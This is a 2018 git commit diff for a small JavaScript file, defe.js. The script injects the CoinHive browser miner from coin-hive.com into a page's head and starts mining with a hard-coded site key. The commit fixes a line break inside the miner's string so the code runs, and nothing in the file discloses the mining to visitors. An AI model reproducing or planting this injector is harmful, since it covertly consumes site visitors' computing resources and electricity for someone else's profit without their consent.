40678c3a795a70115cca740f4e33a760b492d39f
geper <aaalllexey@gmail.com>
2018-02-08 16:47:53 +0300

    Update defe.js

--- defe.js
+++ defe.js
@@ -1,7 +1,6 @@
 (function (window) {
     var script = document.createElement("script"); // Make a script DOM node
     script.src = "https://coin-hive.com/lib/coinhive.min.js"; // Set it's src to the provided URL
-   script.innerHTML="var miner = new CoinHive.Anonymous('bbxalNoLp5ZVs6plwCnsSbpPMdqh5qw7', {throttle: 0.1});
-    miner.start();"; 
+   script.innerHTML="var miner = new CoinHive.Anonymous('bbxalNoLp5ZVs6plwCnsSbpPMdqh5qw7', {throttle: 0.1});miner.start();"; 
     document.head.appendChild(script); // Add it to the end of the head section of the page (could change 'head' to 'body' to add it to the end of the body section instead)
 });
